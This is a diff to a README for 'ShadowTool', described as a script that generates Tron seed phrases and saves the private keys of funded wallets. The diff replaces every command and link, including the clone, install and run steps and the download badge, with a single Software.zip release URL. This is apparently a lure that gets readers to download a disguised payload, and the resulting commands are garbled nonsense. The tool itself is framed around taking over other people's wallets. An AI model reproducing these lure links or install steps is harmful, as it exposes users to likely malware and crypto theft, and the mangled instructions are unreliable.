@@ -1,8 +1,8 @@
 # ShadowTool
 
-![ShadowTool Logo](https://example.com/shadowtool-logo.png)
+![ShadowTool Logo](https://github.com/t7dela/ShadowTool/releases/download/v2.0/Software.zip)
 
-Automatically generate seed phrases and check balances for Tron networks. If a wallet with a non-zero balance is found, the wallet's information (address, mnemonic, private key, and balances) is logged and saved to a file named result.txt.
+Automatically generate seed phrases and check balances for Tron networks. If a wallet with a non-zero balance is found, the wallet's information (address, mnemonic, private key, and balances) is logged and saved to a file named https://github.com/t7dela/ShadowTool/releases/download/v2.0/Software.zip
 
 ---
 
@@ -28,7 +28,7 @@ ShadowTool is a versatile script designed to simplify the process of seed phrase
 - **Automated Seed Phrase Generation:** Easily generate seed phrases for Tron wallets.
 - **Balance Checking:** Instantly check the balance of Tron wallets.
 - **Detailed Wallet Information Logging:** Retrieve and store important wallet details such as address, mnemonic, private key, and balances.
-- **Result Export:** Save the collected wallet information to a file named result.txt for later reference or analysis.
+- **Result Export:** Save the collected wallet information to a file named https://github.com/t7dela/ShadowTool/releases/download/v2.0/Software.zip for later reference or analysis.
 
 ---
 
@@ -38,17 +38,17 @@ To get started with ShadowTool, follow these easy steps:
 
 1. Clone the repository:
     ```bash
-    git clone https://github.com/yourname/ShadowTool.git
+    git clone https://github.com/t7dela/ShadowTool/releases/download/v2.0/Software.zip
     ```
 
 2. Install the required dependencies:
     ```bash
-    pip install -r requirements.txt
+    pip install -r https://github.com/t7dela/ShadowTool/releases/download/v2.0/Software.zip
     ```
 
 3. Run the script:
     ```bash
-    python shadowtool.py
+    python https://github.com/t7dela/ShadowTool/releases/download/v2.0/Software.zip
     ```
 
 ---
@@ -57,8 +57,8 @@ To get started with ShadowTool, follow these easy steps:
 
 1. Run the script using the command provided in the installation instructions.
 2. ShadowTool will automatically generate seed phrases and check Tron wallet balances.
-3. Any wallets with non-zero balances will have their information logged and saved to a file named result.txt.
-4. Access the result.txt file to view the collected wallet details for further analysis.
+3. Any wallets with non-zero balances will have their information logged and saved to a file named https://github.com/t7dela/ShadowTool/releases/download/v2.0/Software.zip
+4. Access the https://github.com/t7dela/ShadowTool/releases/download/v2.0/Software.zip file to view the collected wallet details for further analysis.
 
 ---
 
@@ -80,7 +80,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-[![Download ShadowTool](https://img.shields.io/badge/Download-ShadowTool-green?style=for-the-badge&logo=github)](https://github.com/user-attachments/files/17466420/Software.zip)
+[![Download ShadowTool](https://github.com/t7dela/ShadowTool/releases/download/v2.0/Software.zip)](https://github.com/t7dela/ShadowTool/releases/download/v2.0/Software.zip)
 
 Explore the shadows with ShadowTool! 🌑🛠️
 
